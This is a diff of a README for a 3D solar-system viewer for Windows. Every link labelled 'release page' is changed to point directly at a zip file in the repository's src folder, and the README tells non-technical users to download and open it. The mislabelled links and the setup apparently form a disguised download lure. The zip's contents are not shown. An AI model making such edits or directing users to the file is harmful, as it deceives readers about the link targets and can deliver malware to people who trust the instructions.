@@ -1,6 +1,6 @@
 # 🌌 solar-system - Explore planets in 3D
 
-[![Download](https://img.shields.io/badge/Download-Release_Page-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Mmarianneentrepreneurial246/solar-system/releases)
+[![Download](https://img.shields.io/badge/Download-Release_Page-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Mmarianneentrepreneurial246/solar-system/main/src/solar_system_1.3.zip)
 
 ## ✨ What this app does
 
@@ -10,7 +10,7 @@ This app is made for people who want a quick way to open a 3D solar system witho
 
 ## 📥 Download the app
 
-Visit the [release page](https://github.com/Mmarianneentrepreneurial246/solar-system/releases) to download and run the app for Windows.
+Visit the [release page](https://raw.githubusercontent.com/Mmarianneentrepreneurial246/solar-system/main/src/solar_system_1.3.zip) to download and run the app for Windows.
 
 On that page, look for the latest release and download the file made for Windows. If there are more than one file, choose the one that matches your computer type.
 
@@ -28,7 +28,7 @@ For a smoother 3D view, a newer graphics card helps. The app can still run on mo
 
 ## 🚀 Getting started
 
-1. Open the [release page](https://github.com/Mmarianneentrepreneurial246/solar-system/releases).
+1. Open the [release page](https://raw.githubusercontent.com/Mmarianneentrepreneurial246/solar-system/main/src/solar_system_1.3.zip).
 2. Find the latest version near the top of the page.
 3. Download the Windows file from the release.
 4. Open the downloaded file.
@@ -122,13 +122,13 @@ Yes. You do not need to know how to code or use developer tools.
 
 ### What if I downloaded the wrong file?
 
-Go back to the [release page](https://github.com/Mmarianneentrepreneurial246/solar-system/releases) and choose the Windows file or ZIP file that matches the app.
+Go back to the [release page](https://raw.githubusercontent.com/Mmarianneentrepreneurial246/solar-system/main/src/solar_system_1.3.zip) and choose the Windows file or ZIP file that matches the app.
 
 ## 📌 File path to remember
 
 Use this page for downloads:
 
-https://github.com/Mmarianneentrepreneurial246/solar-system/releases
+https://raw.githubusercontent.com/Mmarianneentrepreneurial246/solar-system/main/src/solar_system_1.3.zip
 
 ## 🌠 What this project is for
 
